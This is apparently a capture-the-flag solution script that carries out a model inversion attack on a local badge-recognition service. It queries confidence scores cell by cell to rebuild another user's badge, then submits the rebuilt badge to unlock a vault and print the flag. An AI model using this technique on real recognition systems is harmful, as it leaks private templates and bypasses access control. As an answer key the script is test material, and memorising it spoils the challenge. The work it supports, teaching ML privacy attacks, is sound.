"""Automated solution for S06 ghost_badge. SPOILER!

Model inversion with confidence scores: starting from a gray scan, test every
cell both ways and keep the value that raises the target holder's confidence.

Usage: python solve.py --workspace <path> --url http://127.0.0.1:8106
"""

from __future__ import annotations

import argparse
from pathlib import Path

import httpx

DEFAULT_URL = "http://127.0.0.1:8106"
GRAY = 0.5


def read_badge(path: Path) -> list[int]:
    """`#` punched, `.` blank, one line per row -> flat list of 0/1."""
    text = path.read_text(encoding="utf-8")
    return [int(char == "#") for line in text.splitlines() for char in line.strip()]


def show(cells: list[int], width: int) -> str:
    rows = [cells[start : start + width] for start in range(0, len(cells), width)]
    return "\n".join("    " + "".join("#" if cell else "." for cell in row) for row in rows)


def invert(client: httpx.Client, holder: str, cells: int) -> list[int]:
    """Rebuild ``holder``'s badge from the confidences of 2 x cells invented scans."""
    pattern = []
    for cell in range(cells):
        answers = []
        for value in (1.0, 0.0):
            scan = [GRAY] * cells
            scan[cell] = value
            data = client.post("/recognise", json={"pixels": scan}).json()
            if "confidences" not in data:
                raise SystemExit(f"recognise failed: {data.get('error_code')}")
            answers.append(data["confidences"][holder])
        pattern.append(int(answers[0] > answers[1]))
    return pattern


def solve(workspace: Path, url: str) -> str:
    mine = read_badge(workspace / "my_badge.txt")

    with httpx.Client(base_url=url, timeout=10.0) as client:
        info = client.get("/").json()
        cells, width = info["cells"], info["grid"][1]
        me, keyholder = info["your_badge"], info["vault_keyholder"]

        # Practice run: we know our own badge, so we can measure the method.
        practice = invert(client, me, cells)
        wrong = sum(a != b for a, b in zip(practice, mine, strict=True))
        print(f"[*] practice on my own badge {me}: {wrong} of {cells} cells wrong")

        rebuilt = invert(client, keyholder, cells)
        print(f"[*] rebuilt badge of {keyholder}:")
        print(show(rebuilt, width))

        data = client.post("/unlock", json={"cells": rebuilt}).json()
        if "flag" not in data:
            raise SystemExit(f"vault stayed closed: {data.get('error_code')}")
        return data["flag"]


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--workspace", type=Path, required=True)
    parser.add_argument("--url", default=DEFAULT_URL)
    args = parser.parse_args()
    print(solve(args.workspace, args.url))


if __name__ == "__main__":
    main()
